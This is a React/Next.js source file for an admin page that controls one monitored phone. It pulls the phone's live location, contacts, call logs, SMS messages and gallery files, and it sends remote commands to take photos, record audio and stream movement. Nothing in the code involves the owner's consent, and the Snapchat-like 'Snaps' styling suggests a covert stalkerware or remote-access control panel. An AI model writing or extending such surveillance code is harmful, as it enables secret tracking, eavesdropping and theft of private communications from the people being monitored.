// app/admin/devices/[id]/page.tsx
"use client";

import React, { useEffect, useState, useCallback } from "react";
import { useParams } from "next/navigation";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
import { DeviceTabBar } from "@/components/admin/devices/DeviceTabBar";
import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
import { createClient } from "@/lib/supabase/client";

const tabCache = new Map<string, { data: any; time: number }>();

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const [device, setDevice] = useState<MonitoredDevice | null>(null);
  const [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [captures, setCaptures] = useState<any[]>([]);
  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
  const [files, setFiles] = useState<DeviceFileItem[]>([]);
  const [filesLoading, setFilesLoading] = useState(false);
  const [appCount, setAppCount] = useState(0);
  const [activeTab, setActiveTab] = useState("map");
  const [loading, setLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [toast, setToast] = useState<string | null>(null);
  const [isLiveMovement, setIsLiveMovement] = useState(false);

  const showToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(null), 3500); };

  // Ultra-fast lightweight poll: only fetches device status, latest location & commands
  const fetchLightStatus = useCallback(async () => {
    if (!deviceId) return;
    try {
      const t = Date.now();
      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
      const [devRes, locRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
      ]);

      if (devRes.device) {
        setDevice(devRes.device);
        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
      }
      if (locRes.locations) setLocations(locRes.locations);
      if (cmdRes.commands) {
        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
      }
    } catch (err) {
      console.error("Telemetry fetch error", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  const fetchTabData = useCallback(async (tab: string, bypass = false) => {
    if (!deviceId) return;
    const cacheKey = `${deviceId}:${tab}`;
    const cached = tabCache.get(cacheKey);
    if (!bypass && cached && Date.now() - cached.time < 120000) {
      if (tab === "contacts") setContacts(cached.data);
      else if (tab === "calls") setCalls(cached.data);
      else if (tab === "messages") setMessages(cached.data);
      else if (tab === "gallery") setFiles(cached.data);
      return;
    }
    const t = Date.now();
    const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
    const load = async (type: string, limit: number, setter: (d: any) => void) => {
      try {
        const res = await fetch(`/api/devices/${deviceId}/data?type=${type}&limit=${limit}&_t=${t}`, noStore).then((r) => r.json());
        if (res[type]) {
          setter(res[type]);
          tabCache.set(cacheKey, { data: res[type], time: Date.now() });
        }
      } catch (e) { console.error(e); }
    };
    if (tab === "contacts") await load("contacts", 10000, setContacts);
    else if (tab === "calls") await load("calls", 500, setCalls);
    else if (tab === "messages") await load("messages", 500, setMessages);
    else if (tab === "gallery") {
      setFilesLoading(true);
      await load("files", 200, setFiles);
      setFilesLoading(false);
    }
  }, [deviceId]);

  useEffect(() => {
    fetchTabData(activeTab);
  }, [activeTab, fetchTabData]);

  const handleFullRefresh = async () => {
    setIsRefreshing(true);
    tabCache.clear();
    showToast("🔄 Refreshing all device & tab data...");
    await Promise.all([fetchLightStatus(), fetchTabData(activeTab, true)]);
    showToast("✅ Everything updated successfully!");
    setIsRefreshing(false);
  };

  useEffect(() => {
    fetchLightStatus();
    const interval = setInterval(fetchLightStatus, 12000);
    return () => clearInterval(interval);
  }, [fetchLightStatus]);

  useEffect(() => {
    if (!deviceId || !isLiveMovement) return;
    const channel = createClient().channel(`device-live:${deviceId}`)
      .on("broadcast", { event: "location" }, (p: any) => {
        if (p.payload?.latitude && p.payload?.longitude) setLocations((prev) => [p.payload, ...prev.slice(0, 49)]);
      }).subscribe();
    return () => { createClient().removeChannel(channel); };
  }, [deviceId, isLiveMovement]);

  const sendCommand = async (command: string, payload = {}, label = "Command") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, payload }),
    });
    showToast(`⚡ ${label} sent to phone!`);
    fetchLightStatus();
  };

  const handleToggleLiveMovement = (active: boolean) => {
    setIsLiveMovement(active);
    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
  };
  const handleDeleteCommand = async (cmdId: string) => {
    await fetch(`/api/devices/${deviceId}/commands?command_id=${cmdId}`, { method: "DELETE" });
    showToast("🗑️ Item deleted successfully!");
    fetchLightStatus();
  };

  if (loading && !device) {
    return <div className="flex items-center justify-center min-h-[400px]"><div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" /></div>;
  }
  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;

  const counts = (device as any)?.counts || {};
  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Feed", icon: Radio },
    { id: "gallery", label: `Gallery (${counts.gallery ?? files.length})`, icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
    { id: "apps", label: `Apps (${counts.apps ?? appCount})`, icon: Layers },
    { id: "contacts", label: `Contacts (${counts.contacts ?? contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${counts.calls ?? calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${counts.messages ?? messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      {toast && (
        <div className="fixed top-6 right-6 z-50 py-3 px-5 rounded-2xl bg-black/90 border border-[#FFFC00]/40 text-[#FFFC00] text-xs font-bold shadow-2xl backdrop-blur-xl flex items-center gap-2">
          <span>{toast}</span>
        </div>
      )}

      <DeviceDetailHeader device={device} onRefresh={handleFullRefresh} isRefreshing={isRefreshing} />

      <DeviceTabBar tabs={TABS} activeTab={activeTab} onSelectTab={setActiveTab} />

      <DeviceTabViews
        activeTab={activeTab}
        device={device}
        locations={locations}
        contacts={contacts}
        calls={calls}
        messages={messages}
        captures={captures}
        audioClips={audioClips}
        files={files}
        filesLoading={filesLoading}
        isLiveMovement={isLiveMovement}
        onToggleLiveMovement={handleToggleLiveMovement}
        onSendCommand={sendCommand}
        onDeleteCommand={handleDeleteCommand}
      />
    </div>
  );
}
